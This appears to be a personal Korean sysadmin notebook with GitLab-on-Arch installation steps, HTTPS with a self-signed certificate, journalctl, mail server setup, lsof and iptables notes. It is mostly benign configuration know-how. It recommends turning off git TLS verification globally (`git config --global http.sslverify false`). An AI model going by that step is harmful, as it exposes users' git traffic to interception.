    부분에서는 systemd에 맞게 직접 작성하여야 한다.  
    이러저러한 이유로 AUR에 있는 gitlab package 를 사용하여 설치하는데이것이 gitlab manual 설치 설명서에서 gitlab 을 git에서 clone 하는부분  
    
    ```text
    sudo -u git -H git clone https://gitlab.com/gitlab-org/gitlab-ce.git -b 7-6-stable gitlab
    ```
    
    만 archlinux 패키지로 설치하는 것과 같고 나머지는 일일이 수정해 주어야하는데다 설정이 다르기 때문에 오히려 더 햇갈린다. 그야말로 패키지 하나설정하는데 몇일 걸릴 수도 있다.  
    archwiki의 gitlab 문서는 현재 버전과 안맞는 부분이 있다.  
    gitlab 의 manual 설치 문서는 archlinux에 안맞는 부분이 있다.  
    그래서 두가지를 혼합하여 참고하여 설치하여야 한다.  
    
    1.   중요 포인트
    
        1.  gitlab 설명서의 gitlab 사용자는 git 이고 archlinux 패키지에서는  
            gitlab이다. 이는 설치시 자주 사용하는 sudo -u 명령에서나 설정에서사용자를 archlinux 에서는 gitlab을 사용하여야 한다.
        2.  gitlab 설치 설명서의 사용자 home 디렉토리는 /home/git 이고이 아래 모든 것을 설치하지만 archlinux 에서는  
            /var/lib/gitlab이 사용자의 home 디렉토리이고  
            /usr/share/webapps/gitlab 아래 주요 파일들이 설치되고  
            /etc/webapps/gitlab 아래 설정 파일을 둔다.
    
    2.   설치
    
        1.  yaourt -Sy gitlab
        2.  DB 설치(postgres)  
            user 와 pass 는 적당하게 기입한다.  
            
            ```text
            $ sudo pacman -Sy postgresql
            $ sudo -i -u postgres
            [postgres]$ initdb --locale en_US.UTF-8 -E UTF8 -D '/var/lib/postgres/data'
            [postgres]$ exit
            $ sudo -u postgres psql -d template1
            template1=# CREATE USER gitlab WITH PASSWORD 'secret';
            template1=# CREATE DATABASE gitlabhq_production OWNER gitlab;
            template1=# \q
            ```
        3.  DB 설정  
            $ sudo cp /usr/share/doc/gitlab/database.yml.postgresql  
            /etc/webapps/gitlab/database.yml  
            production을 설치할 것이므로 production 부분의 username,  
            password 부분만 설치한 db에 맞게 기입하면 된다.
        4.  redis 설치 및 설정  
            $ sudo pacman -S redis  
            redis group에 gitlab 추가  
            $ sudo usermod -aG redis gitlab
        5.  nginx 설치및 설정  
            $ sudo pacman -S nginx  
            $ sudo cp lib/support/nginx/gitlab /etc/nginx/sites-available/gitlab  
            $ sudo ln -s /etc/nginx/sites-available/gitlab /etc/nginx/sites-enabled/gitlab
        
        6.  위 issue 에 정리된 내용 실행
        7.  gitlab 사용자 git 설정  
            
            ```text
            cd /usr/share/webapps/gitlab
            sudo -u git -H git config --global user.name "GitLab"
            sudo -u git -H git config --global user.email "example@example.com"
            sudo -u git -H git config --global core.autocrlf input
            ```
        8.  db 초기화 와 기능 활성화  
            sudo -u gitlab bundle exec rake gitlab:setup RAILS\_ENV=production
        9.  compile assets  
            sudo -u gitlab -H bundle exec rake assets:precompile RAILS\_ENV=production
        10. $ sudo systemctl daemon-reload
        11. $ sudo systemctl start redis gitlab-sidekiq gitlab-unicorn nginx

3.   https 사용하도록 수정

    1.  /etc/webapps/gitlab/gitlab.yml  
        
        ```text
        port: 443 # Set to 443 if using HTTPS
        https: true # Set to true if using HTTPS
        ```
    2.  /etc/webapps/gitlab-shell/config.yml  
        ca\_file 이 링크 걸려 있는데 그냥 원래 파일을 지정하였다.  
        메뉴얼에는 gitlab\_url을 https 로 바꾸라고 되어 있지만  
        https 하면 unknown protocol (OpenSSL::SSL::SSLError)  
        에러가 난다.  
        
        ```text
        ca_file: /etc/ca-certificates/extracted/tls-ca-bundle.pem
        self_signed_cert: true
        ```
    3.  /etc/nginx/site-available/gitlab-ssl  
        gitlab 폴더의 lib/support/nginx/gitlab-ssl 파일을  
        /etc/nginx/site-available 에 복사한다음  
        /etc/nginx/site-enabled/gitlab-ssl 로 링크하고아래 수정  
        
        ```text
        ssl_certificate /etc/nginx/ssl/gitlab.crt;
        ssl_certificate_key /etc/nginx/ssl/gitlab.key;
        ```
    4.  self\_signed ssl key를 생성한다.  
        
        ```text
        mkdir -p /etc/nginx/ssl/
        cd /etc/nginx/ssl/
        sudo openssl req -newkey rsa:2048 -x509 -nodes -days 3560 -out gitlab.crt -keyout gitlab.key
        sudo chmod o-r gitlab.key
        ```
    
    1.  <span class="org-todo done DEFERRED">DEFERRED</span>  gitlab-shell https 설정
    
        모든 메뉴얼에서 gitlab-shell 의 config.yml 에서  
        gitlab\_url을 https로 바꾸라고 되어있지만 실제 http로기입해야 git 명령으로 push 등을 할 때 동작한다.  
        일단 gitlab:check 명령에서 부터 에러가 난다.  
        http 로 되어있을시 https 로 redirect  
        되는 지는 알 수 없지만 처음 연결시 url은 https 로기입하는데 내부에서는 또 어떻게 변형이 되는지알 수가 없다.  
    
    2.   https 사용법
    
        1.   브라우저
        
            로컬에서는 http, https가 같이 동작한다. http는 https 로  
            redirect 된다.  
            외부에서는 접속시 공유기 등을 거치면서 https로 접속하지않으면 에러가 난다.  
        
        2.   git
        
            1.  https 로 외부에서 연결시 당연히 포트를 기입하여야 한다.  
                git clone <https://ybgwon.iptime.org:28443/ybgwon/coresystems.git>  
                또 git config 파일에 sslverify 옵셔을 false 로 지정해야 한다.  
                $ cat /home/ybgwon/tmp/coresystems.http/.git/config  
                
                ```text
                [http]
                     sslverify = false
                ```
            2.  외부에서 ssh 연결시 포트 지정법  
                sslverify 옵션을 비활성화한후 연결하여야 한다.  
                git config &#x2013;global http.sslverify false  
                git clone ssh://gitlab@ybgwon.iptime.org:20022/ybgwon/coresystems.git

4.   Tip

    1.   gitlab assets cache clean
    
        sudo -u gitlab -H bundle exec rake assets:clean RAILS\_ENV=production  
        sudo -u gitlab -H bundle exec rake assets:precompile RAILS\_ENV=production  
    
    2.   ssh 비정규 port 지정하기
    
        git 은 ssh를 기본 프로토콜로 사용하므로 ssh 연결에 대한 옵션을  
        ssh config 파일을 편집하여 지정할 수 있다.  
        $ cat $HOME/.ssh/config  
        
        ```text
        host home
             Hostname ybgwon.iptime.org
             Port     20022
             ForwardX11 yes
        ```


### <span class="org-todo done DONE">DONE</span> <span class="section-num">3.3</span> systemd jounalctl 관련 정리하기 {#systemd-jounalctl-관련-정리하기}


#### <span class="section-num">3.3.1</span> EXAM {#exam}

1.   부팅이후 모든 메시지 보기

    $ journalctl -b  
    -1(이전부팅), -2(그 이전부팅)등의 매개변수를 통해 이전부팅 메시지를 볼 수 있다.  
    $ journalctl -b -1  

2.   날짜 지정하여  메시지 보기

    $ journalctl &#x2013;since="2012-10-30 18:17:16"  
    $ journalctl &#x2013;since "20 min ago"  
    $ journalctl -u httpd &#x2013;since=00:00 &#x2013;until=9:30  

3.   새로운 메시지 이어서 보기

    $ journalctl -f  

4.   특정 실행파일 메시지만 보기

    $ journalctl /usr/lib/systemd/systemd  

5.   특정 프로세스 메시지만 보기

    $ journalctl \_PID=1  

6.   특정 유닛메시지만 보기

    $ journalctl -u netcfg  

7.   커널 링버퍼 메시지 보기

    $ journalctl -k  

8.   syslog 의 auth.log 필터링과 같은 기능

    $ journalctl -f -l SYSLOG\_FACILITY=10  

9.   priority level 을 지정하여 보기

    $ journalctl -b -p err  

10.  특정 문자 제외하기

    아직 journalctl 에서 지원하지 않는다. 따로 파이프로 연결하여가공하여야 한다.  
    
    ```text
    $ journalctl -f | grep --line-buffered -iv offlineimap
    ```
    
    [stackoverflow](https://stackoverflow.com/questions/23961915/set-systemd-journalctl-to-ignore-process)  
    
    아니면  services 파일에서 옵션을 설정한다  
    
    ```text
    $ cat /home/ybgwon/.config/systemd/user/offlineimap-oneshot.service
    ...
    StandardOutput=null
    ```
    
    [stackexchange](https://serverfault.com/questions/858843/how-to-disable-logging-for-a-particular-systemd-unit)  


#### <span class="section-num">3.3.2</span> 출력 {#출력}

SYSTEMD\_LESS 환경 변수 설정을 통해 조정할 수 있다.  

```text
$ SYSTEMD_LESS=FRXMK journalctl
```


#### <span class="section-num">3.3.3</span> 링크 {#링크}

<https://wiki.archlinux.org/index.php/Journalctl#Journal>  
<http://0pointer.de/blog/projects/journalctl.html>  


### <span class="org-todo done DEFERRED">DEFERRED</span> <span class="section-num">3.4</span> 리눅스 디바이스 드라이버 책 다시보기 {#리눅스-디바이스-드라이버-책-다시보기}


### <span class="section-num">3.5</span> user management in archlinux {#user-management-in-archlinux}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-01-01 목 20:10&gt;</span></span>  

```text
"add user"
-m equals --create-home
# useradd -m -g [initial_group] -G [additional_groups] -s [login_shell] [username]

"add users to a group"
# gpasswd -a [user] [group]

"delete user account and home directory"
# userdel -r username
```


### <span class="section-num">3.6</span> GitLab project setup {#gitlab-project-setup}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-01-01 목 20:19&gt;</span></span>  

```text
"Git global setup"

git config --global user.name "richebm"
git config --global user.email "richebm@naver.com"

"Create a new repository"

mkdir test2
cd test2
git init
touch README.md
git add README.md
git commit -m "first commit"
git remote add origin git@192.168.0.106:richebm/test2.git
git push -u origin master
```


### <span class="section-num">3.7</span> GitLab import existing Git repository {#gitlab-import-existing-git-repository}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-12-27 일 17:02&gt;</span></span>  

```text
cd existing_git_repo
git push --mirror git@192.168.0.106:richebm/test2.git
cd ..
rm -rf existing_git_repo
```

<https://help.github.com/articles/importing-a-git-repository-using-the-command-line/>  
<https://github.com/gitlabhq/gitlabhq/wiki/Import-existing-repositories-into-GitLab>  
<http://stackoverflow.com/questions/20359936/how-do-i-import-an-existing-git-project-into-gitlab>  


### <span class="section-num">3.8</span> Merge two Git repositories without breaking file history {#merge-two-git-repositories-without-breaking-file-history}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-01-02 금 00:59&gt;</span></span>  
git 에서 기존 저장소의 history를 유지하면서 merge 하는 방법이다.  

```text
# Assume the current directory is where we want the new repository 
# to be created Create the new repository
git init

# Before we do a merge, we have to have an initial commit, so we'll 
# make a dummy commit
dir > deleteme.txt
git add .
git commit -m "Initial dummy commit"

# Add a remote for and fetch the old repo
git remote add -f old_a <OldA repo URL>

# Merge the files from old_a/master into new/master
git merge old_a/master

# Clean up our dummy file because we don't need it any more
git rm .\deleteme.txt
git commit -m "Clean up initial file"

# Move the old_a repo files and folders into a subdirectory 
# so they don't collide with the other repo coming later
mkdir old_a

# . 과 .git 그리고 옮길 디렉토리인 old_a 는 제외하고 모든 파일에 대하여 
# git mv 명령을 실행하여 merge한 파일을 old_a 디렉토리로 옮긴다.
find . -maxdepth 1  ! -regex ".\|./old_a\|./.git" -exec git mv {} old_a \;

# Commit the move
git commit -m "Move merge files into old_a"

# Do the same thing for old_b
git remote add -f old_b <OldB repo URL>
git merge old_b/master
mkdir old_b
find . -maxdepth 1  ! -regex ".\|./old_b\|./.git" -exec git mv {} old_b \;
git commit -m "Move merge files into old_b"
```

[stackoverflow](http://stackoverflow.com/questions/13040958/merge-two-git-repositories-without-breaking-file-history)  


### <span class="section-num">3.9</span> Desktop notifications {#desktop-notifications}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-01-02 금 21:55&gt;</span></span>  
linux에서 desktop알림 메시지를 셸 명령어로 실행시킬 수 있다.  

```text
$ notify-send "This message will be displayed for 3 seconds" -t 3000
```

[stackoverflow](http://stackoverflow.com/questions/10106659/desktop-notifications-about-shell-command-completed)  
[archwiki](https://wiki.archlinux.org/index.php/Desktop%5Fnotifications)  


### <span class="section-num">3.10</span> openssl 을 이용한 암호화및 복호화 {#openssl-을-이용한-암호화및-복호화}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-01-08 목 01:09&gt;</span></span>  

```text
$ echo Hi | openssl enc -aes-128-cbc -a -salt -pass pass:wtf
U2FsdGVkX18qAdhqop1SffsewHue6EOPNKv9dXc/0rI=
$ echo U2FsdGVkX18qAdhqop1SffsewHue6EOPNKv9dXc/0rI= | \
openssl enc -aes-128-cbc -a -d -salt -pass pass:wtf
Hi
```

<http://www.unix.com/shell-programming-and-scripting/156250-encrypt-decrypt-string.html>  
<http://superuser.com/questions/20549/how-can-i-encrypt-a-string-in-the-shell>  
<http://how-to.linuxcareer.com/using-openssl-to-encrypt-messages-and-files>  


### <span class="org-todo done DONE">DONE</span> <span class="section-num">3.11</span> 메일 관련 재정리 {#메일-관련-재정리}

gnus 에서 imap설정를 통해 메일을 사용하기로 하고 설정을 하는 동안잊어버린 부분도 있고 변경된 부분도 있고 해서 다시 정리하게 됨.  


#### <span class="section-num">3.11.1</span> Local Mail {#local-mail}

local mail의 경우 서버가 아닌 경우 많이 사용하지는 않지만주요 시스템에서 정보가 메일로 보내지는 경우가 많으므로 설정하는것이 좋다. 이것은 MTA를 설치해야 로컬 메일도 수신이 가능하다.  
이전에는 sendmail을 사용하였으나 요즘은 exim4 나 postfix를주로 사용한다.  
도메인이 없고 항시 접속이 불가능한 데스크탑의 경우 smarthost  
설정을 통해 로컬 메일은 그대로 사용하고 보내는 메일만릴레이 설정을 통해 구글등의 smtp 계정을 이용하여 메일을보낼 수 있다.  

-   참조 - MTA 비교. <https://wiki.debian.org/Debate/DefaultMTA>

1.   사용자 메일박스

    일단 MTA 를 통해 로컬메일 전달이 설정되면 로컬사용자에게 전달된메일은 /var/spool/mail/userid 에 저장이 된다. 이 파일은 보통호환성을 위해 /var/mail/userid로 링크가 되어있다.  
    이 파일은 설정에 따라 다른 곳으로 옮겨 질 수 있는데  
    MTA의 설정에 따라 이곳에 저장되지 않고 바로 사용자 HOME의특정 디렉토리로 저장되기도 하고 전통적으로 procmail 설정을통해 분류하여 옮겨 질 수 있다. 이렇게 되면 메일이도착하여도 /var/spool/mail/userid 에는 저장되지 않으므로  
    /var/spool/mail/userid를 기본으로 검색하는 텍스트방식의 mail  
    같은 프로그램에서는 새 mail을 확인할 수 없다.  


#### <span class="section-num">3.11.2</span> MTA {#mta}

1.   Postfix 설정

    패키지를 이용하여 설치한 다음 주로 /etc/postfix/main.cf 파일을편집한다.  
    데비안은 설치시 몇가지 질문을 통해 자동으로 server, smarthost,  
    localonly 등이 자동 설정되고 나중에 아래 명령을 통해서도설정을 변경할 수 있다.  
    
    ```text
    $ sudo dpkg-reconfigure postfix 
    ```
    
    1.   로컬메일 전용
    
        postfix 를 단지 로컬메일 전달에만 사용하는 경우이다.  
        
        -   home\_mailbox 설정  
            1.  home\_mailbox = Mailbox  
                받은 메일을 홈의 Mailbox 라는 하나의 파일에 저장
            2.  home\_mailbox = Maildir/  
                받은 메일을 maildir 포멧으로 홈의 Maildir아래 저장
            3.  설정하지 않으면 system spool(/var/spool/mail/userid)을 사용.
        
        <!--listend-->
        
        ```text
        myhostname = localhost
        mydomain = localdomain
        inet_interfaces = $myhostname, localhost
        mydestination = $myhostname, localhost.$mydomain, localhost
        mynetworks_style = host
        default_transport = error:outside mail is not deliverable
        ```
    
    2.   gmail smarthost
    
        gmail smtp를 사용하기 위해서는 당연히 gmail 인증서 파일을만들어야 한다.  
        /etc/postfix/sasl\_passwd 를 만들고 postmap명령을 실행  
        
        ```text
        $ cat  /etc/postfix/sasl_passwd
        [smtp.gmail.com]:587  username:password"
        $ sudo chmod 640 /etc/postfix/sasl_passwd
        $ sudo postmap /etc/postfix/sasl_passwd
        ```
        
        /etc/postfix/main.cf 파일을 아래처럼 변경  
        
        ```text
        # sets gmail as relay
        relayhost = [smtp.gmail.com]:587
        #  use tls
        smtp_use_tls=yes
        # use sasl when authenticating to foreign SMTP servers
        smtp_sasl_auth_enable = yes 
        # path to password map file
        smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd
        # list of CAs to trust when verifying server certificate
        smtp_tls_CAfile = /etc/ssl/certs/ca-certificates.crt
        # eliminates default security options which are incompatible with gmail
        smtp_sasl_security_options =
        ```
    
    3.   alias 설정
    
        archwiki 에서는 postalias /etc/postfix/aliases 명령을 내린후데몬을 reload 하라고 되어 있지만 aliases, aliases.db 파일을  
        /etc 아래에 두어야 동작했다.  
        /etc/aliases 파일을 편집한후  
        
        ```text
        $ sudo newaliases 
        ```
        
        명령만으로 동작한다.  
        ==> local mail설정에서 debian 설정 파일을 그대로 복사해서 였다.  
        archlinux 기본 설정 파일은  
        alias\_maps = hash:/etc/postfix/aliases  
        라고 따로 설정하고 있다.  
        <https://wiki.archlinux.org/index.php/Local%5FMail%5FDelivery%5Fwith%5FPostfix>  
    
    4.   링크
    
        <http://cafim.sssup.it/~giulio/other/Postfix%5FSetup%5Ffor%5FLocal%5FMail%5FOnly.html>  
        <https://wiki.archlinux.org/index.php/Postfix>  

2.   Exim 설정

    exim은 데비안 default MTA이고 데비안에서는 손쉽게 설정이 가능하다.  
    <https://wiki.debian.org/GmailAndExim4>  

3.   msmtp 설정

    로컬메일은 사용할 수 없으나 외부 smtp를 사용하여 메일을 보낼 수있도록 한다. 사용자 디렉토리에 $HOME/.msmtprc 파일만 설정하면메일보내기가 가능하다. 보통 MUA 에서도 smtp설정이 가능하나  
    msmtp를 사용하는 장점은 mailx 등의 command line 프로그램에서도메일 보내기가 가능하다는 점이다. 또 외부계정 설정 파일을  
    plain text로 저장하지 않고 암호화된 파일로 저장할 수 있는장점도 있다.  
    msmtp에서 command line으로 메일을 보내기위해서는  
    $HOME/.mailrc  
    
    ```text
    set sendmail=/usr/bin/msmtp
    ```
    
    를 위와 같이 설정하던가 msmtp-mta 패키지를 설치하여야 한다.  
    
    1.   gmail msmtp 설정
    
        ```text
        $ cat ~/.msmtprc
        
        # Set default values for all following accounts.
        defaults
        auth           on
        tls            on
        tls_trust_file /etc/ssl/certs/ca-certificates.crt
        logfile        ~/.msmtp.log
        
        # Gmail
        account        gmail
        host           smtp.gmail.com
        port           587
        from           username@gmail.com
        user           username
        # password       plain-text-password
        passwordeval   passwordeval gpg -d ~/.msmtp.password.gpg
        
        # A freemail service
        account        freemail
        host           smtp.freemail.example
        from           joe_smith@freemail.example
        ...
        
        # Set a default account
         account default : gmail
        ```
        
        <https://wiki.archlinux.org/index.php/msmtp>  


#### <span class="section-num">3.11.3</span> MDA {#mda}

1.   procmail

    procmail은 메일이 도착하면 바로 ~/.procmailrc 나 /etc/procmailrc  
    가 있으면 그 규칙에 따라 메일을 분류해 버린다. 위 파일이 없으면원래대로 기본 시스템 mailbox(보통 /var/spool/mail/userid)에저장한다.  
    postfix 에서 procmail을 사용하려면 따로 설정하여야 한다.  
    mua에도 메일 필터링 기능이 있으므로 요즘 잘 사용하지 않는다.  


#### <span class="section-num">3.11.4</span> MUA {#mua}

1.   command line

    command line 으로 메일을 읽고 쓸 수 있는 패키지는데비안에서는 bsd-mailx, archlinux에서는 s-nail이 기본이다.  
    모두 메일읽기는 system 메일 박스 (/var/spool/mail/uerid)를 사용하고메일 보내기는 시스템의 sendmail 명령을 사용한다.  

2.   gnus 설정

    -   레이아웃나는 emacs를 가로로 분활해서 사용하는데 gnus 실행하고 나면레이아웃이 깨져 버린다. gnus를 하나의 프레임에서 레이아웃이깨지지 않고 실행하려면 아래를 설정하여야 한다.  
        
        ```lisp
        ;; 레이아웃이 깨지는 것 방지
        ;; http://www.emacswiki.org/emacs/OneWindow
        (setq gnus-use-full-window nil)
        
        (defadvice gnus-configure-windows (after maybe-switch-to-summary (setting &optional force))
          "Set-buffer to `gnus-summary-buffer' if SETTING is the symbol `article'."
          (when (and (eq setting 'article)
        	     (buffer-live-p gnus-summary-buffer))
            (set-buffer gnus-summary-buffer)))
        
        (ad-activate 'gnus-configure-windows)
        
        (setq gnus-save-newsrc-file nil
        gnus-read-newsrc-file nil
        gnus-use-dribble-file nil
        gnus-interactive-exit nil
        gnus-save-killed-list nil)     
        ```
    
    -   gnus에서 로컬 메일을 보기 위한 설정  
        (setq gnus-select-method '(nnml ""))  
        위 설정으로 system 메일 spool에 있는 로컬 메일을 읽어 올 수 있다.  
        gnus 처음 시작시 Group 버퍼에서 ^ 키를 누르면 서버 버퍼를볼 수 있는데 거기서 nnml 항목으로 들어가면 misc 라고 되어 있는부분이 system 메일 spool 이다. 이것을 u 키를 누르고 subscribe  
        하면 된다.  
        이전에는 nnmaildir 형식으로 하였었다.
    
    -   imap, smtp 설정 - emacswiki 참조
    -   메일 알림  
        gmail 알림은 gmail-notifier 패키지를 설치하였다.  
        gnus-notify등의 패키지는 gnus와 연동되는데 gnus가 시작되어야메일 알림도 받을 수 있고 종료되어도 메일 알림을 받을 수가 없다.  
        gnus를 종료하지 않는다는 조건하인데 실수로 종료 시킬 수도 있고  
        emacs 시작시 gnus 를 바로 실행시켜야 메일알림을 받을 수 있는문제도 있다.  
        이멕스 시작시 gnus를 실행시키고 gnus는 종료하지 않으면 되지만  
        imap을 설정하고 authinfo.gpg 를 사용할 경우 시작시 패스워드를물어오는 불편함이 있다. 그렇다고 authinfo 를 평문으로 저장하기엔찜찜하다.  
        그래서 gmail-notifier를 사용하고 localmail 에 대해서는  
        display-time 함수에서 mail만 나타나게 하도록 변경하여사용중이다.  
        smtp 설정의 경우 패스워드를 설정에 적을 수 있게 되어 있어  
        inline passwd 를 사용할 수 있지만 imap 은 그것도 안된다.  
        그래서 이런 기형적인 설정이 되는 것이다.
    -   문제점  
        1.  메일 알림에 관련하는 gnus-demon 이 gnus가 실행중인 경우만동작한다.
        
        2.  imap의 경우 authinfo 파일 인증만 된다.
        
        3.  gnus-notify 류의 메일알림을 사용하지 않으면 일일이 사용자설정을 하여야 한다.
    
    -   해결책가장 좋은 방법은 gmail-notifier가 모든 메일 소스를 지원하고  
        gnus와 연동되어 동작하는 것이다.


#### <span class="section-num">3.11.5</span> 나의 설정 {#나의-설정}

로컬 메일을 사용하기 위하여 데비안에서는 exim4, archlinx에서는  
postfix를 사용하였다.  
메일을 보내기위해서는 exim4나 postfix 의  smarthost 설정을이용하지 않고 시스템 메일을 위해서는 msmtp, gnus에서는자체 smtp설정을 사용하였다. 이유는 exim4나 postfix가  
plain text 로 인증을 저장하는 것이 거슬려서 이다.  
메일보기는 외부 메일은 gnus의 gmail imap 설정을 사용하고  
local mail은 gnus의 nnml 설정을 이용하였다.  
메일 설정이 이렇게 오래 걸린 이유는 인증을 plain text로저장하는 것을 피하기 위함과 gnus-demon 이 gnus 에 종속적인것 때문에 외부 메일 알림을 사용하고자 했기 때문이다.  


### <span class="org-todo done DONE">DONE</span> <span class="section-num">3.12</span> GitHub 메뉴얼 정리 {#github-메뉴얼-정리}


#### <span class="section-num">3.12.1</span> fork 사용법 {#fork-사용법}

github 에서 마음에 드는 프로젝트가 있다면 우측 상단의  
Fork 아이콘을 클릭하여 내 저장소로 복사해 올 수 있다.  
일단 Fork 해온 프로젝트는 나만의 독립된 저장소이다.  
그냥 저장소전체를 리눅스에서 cp -r 로 복사한 것과같다고 보면 되겠다.  
포크한 저장소에 대하여 로컬에 다운해서 브랜치를 새로생성하고 상위 저장소와 동기화 시키는 등의 일반적인작업 흐름은 다음과 같다.  

1.  포크한 저장소를 로컬에 복사한다.  
    $ git clone <https://github.com/ybgwon/gitlabhq.git>
2.  작업할 브랜치를 하나 생성한다.  
    $ git checkout -b mybr
3.  동기화를 위해 원래 저장소를 더한다.  
    $ git remote add upstream <https://github.com/gitlabhq/gitlabhq.git>
4.  이제 상위 저장소와 동기화 할 필요가 있다면 fetch 해와서 merge 한다.  
    $ git fetch upstream  
    $ git checkout master  
    $ git merge upstream/master  
    여기 까지 하면 master 브랜치는 상위 저장소의 최신판과 일치한다.  
    하지만 내가 작업하는 브랜치도 동기화 하려면  
    $ git checkout mybr  
    $ git merge master  
    
    생각해 보니  
    $ git pull upstream master  
    $ git merge master  
    이렇게 2줄로 줄일 수는 있겠다.
5.  변경한 부분을 upstream 에 merge 하고 싶다면좌측상단 브랜치 드랍다운 상자 옆에 버튼을 누르고  
    pull request 를 생성하면 된다.


### <span class="section-num">3.13</span> lsof 사용시 주의사항 {#lsof-사용시-주의사항}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-04-17 금 17:42&gt;</span></span>  
lsof 사용시 루트사용자로 실행하지 않아 리스트가 나타나지않을 수 있다.  


### <span class="section-num">3.14</span> lsof command {#lsof-command}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-04-18 토 11:05&gt;</span></span>  
현재 시스템에 열린 파일 목록을 나열한다.  
특정 포트가 사용하는 명령을 알고자 할 때나특정 파일이 사용하는 명령을 알고자 할 때 유용하다.  


#### <span class="section-num">3.14.1</span> 특정 포트 사용하는 프로세스 정보 보기 {#특정-포트-사용하는-프로세스-정보-보기}

i 옵션에 콜론뒤에 포트번호를 적는다.  

```text
$ sudo lsof -i :443
```


#### <span class="section-num">3.14.2</span> 특정 사용자가 사용하는 프로세스 정보 {#특정-사용자가-사용하는-프로세스-정보}

```text
$ sudo lsof -u ybgwon
```


#### <span class="section-num">3.14.3</span> 특정 파일을 사용하는 프로세스 정보 {#특정-파일을-사용하는-프로세스-정보}

```text
$ sudo lsof /var/log/syslog
```


#### <span class="section-num">3.14.4</span> 특정 command 가 사용하는 프로세스 정보 {#특정-command-가-사용하는-프로세스-정보}

```text
$ sudo lsof emacs
```


#### <span class="section-num">3.14.5</span> 특정 파일 사용하는 프로세스 kill {#특정-파일-사용하는-프로세스-kill}

```text
$ sudo kill -HUP `lsof -t /u/abe/bar`
```


#### <span class="section-num">3.14.6</span> 링크 {#링크}

<http://lesstif.com/pages/viewpage.action?pageId=20776078>  
<https://danielmiessler.com/study/lsof/>  


### <span class="section-num">3.15</span> iptables command {#iptables-command}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-04-18 토 12:49&gt;</span></span>  
리눅스 커멘드 라인용 기본 방화벽 설정 프로그램이다.  


#### <span class="section-num">3.15.1</span> 기본 출력 {#기본-출력}

L 명령으로 현재 상태를 확인 할 수 있고  
n 옵션은 도메인 대신 아이피 주소를 출력해 준다.  
v 옵션은 자세한 출력. lo, eth0 등의 인터페이스를 확인할 수 있다.  
line-numbers 옵션은 룰셋 넘버를 출력해 주는데변경이나 삭제시 필요하다.  

```text
$ sudo iptables -L -v -n --line-numbers
```


#### <span class="section-num">3.15.2</span> 불러오기 {#불러오기}

파일에 저장한 룰셋 불러오기  

```text
$ sudo iptables-restore < /etc/iptables
```


#### <span class="section-num">3.15.3</span> 초기화 {#초기화}

```text
$ sudo iptables -F
$ sudo iptables -X
```


#### <span class="section-num">3.15.4</span> 저장하기 {#저장하기}

```text
$ sudo sh -c 'iptables-save > /etc/iptables/iptables.up.rules'
```


#### <span class="section-num">3.15.5</span> 삭제하기 {#삭제하기}

```text
$ sudo iptables -D INPUT 4
```


#### <span class="section-num">3.15.6</span> LOG {#log}

log는 새로운 체인을 생성해서 관리하는 것이 편하다.  

```sh
// 체인 생성
$ sudo iptables -N logdrop

// 생성한 체인에 룰 추가
$ sudo  iptables -A logdrop -m limit --limit 5/m --limit-burst 10 -j LOG
$ sudo  iptables -A logdrop -j REJECT

// drop 룰에서 logdrop 체인으로 점프
$ sudo iptables -A INPUT -m conntrack --ctstate INVALID -j logdrop
```


#### <span class="section-num">3.15.7</span> Exam {#exam}

```text
*filter

# Allows all loopback (lo0) traffic and drop all traffic to 127/8 that doesn't use lo0
-A INPUT -i lo -j ACCEPT
-A INPUT ! -i lo -d 127.0.0.0/8 -j REJECT

# Accepts all established inbound connections
-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allows all outbound traffic
# You could modify this to only allow certain traffic
-A OUTPUT -j ACCEPT

# Allows HTTP and HTTPS connections from anywhere (the normal ports for websites)
-A INPUT -p tcp --dport 80 -j ACCEPT
-A INPUT -p tcp --dport 443 -j ACCEPT

# Allows SSH connections 
# The --dport number is the same as in /etc/ssh/sshd_config
-A INPUT -p tcp -m state --state NEW --dport 22 -j ACCEPT

# Now you should read up on iptables rules and consider whether ssh access 
# for everyone is really desired. Most likely you will only allow access from certain IPs.

# Allow ping
#  note that blocking other types of icmp packets is considered a bad idea by some
#  remove -m icmp --icmp-type 8 from this line to allow all kinds of icmp:
#  https://security.stackexchange.com/questions/22711
-A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT

# log iptables denied calls (access via 'dmesg' command)
-A INPUT -m limit --limit 5/min -j LOG --log-prefix "iptables denied: " --log-level 7

# Reject all other inbound - default deny unless explicitly allowed policy:
-A INPUT -j REJECT
-A FORWARD -j REJECT

COMMIT
```


### <span class="section-num">3.16</span> xtable {#xtable}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-04-18 토 16:09&gt;</span></span>  
geoip 데이터를 이용하여 국가별 iptable 설정이 가능하고  
psd 모듈을 통해 port 스캔을 방지할 수 있다.  


#### <span class="section-num">3.16.1</span> 설치 {#설치}

```text
# 패키지 설치
$ sudo apt-get install linux-headers-`uname -r` \
iptables-dev module-assistant xtables-addons-common \
libtext-csv-xs-perl
# 모듈 빌드
$ sudo module-assistant --verbose --text-mode auto-install xtables-addons
# geoip data 다운로드
$ cd /usr/lib/xtables-addons/  
$ sudo ./xt_geoip_dl
$ sudo ./xt_geoip_build GeoIPCountryWhois.csv
# data 복사
$ sudo mkdir -p /usr/share/xt_geoip/  
$ cp -r {BE,LE} /usr/share/xt_geoip/  
```


#### <span class="section-num">3.16.2</span> geoip 데이타 업데이트 스크립트 {#geoip-데이타-업데이트-스크립트}

-   GeoIP\_update.sh  
    
    ```sh
    #!/bin/bash
    # /usr/share/xt_geoip/GeoIP_update.sh
    # Change this path to your actual "xtables-addons" folder.
    # For Debian, use "/usr/lib/xtables-addons/".
    cd /usr/lib/xtables-addons
    ./xt_geoip_dl
    [ ! -f "./GeoIPCountryWhois.csv" ] && { echo "Error: GeoIPCountryWhois.csv file not found."; exit 1; }
    [ ! -s "./GeoIPCountryWhois.csv" ] && { echo "Error: GeoIPCountryWhois.csv file is empty."; exit 1; }
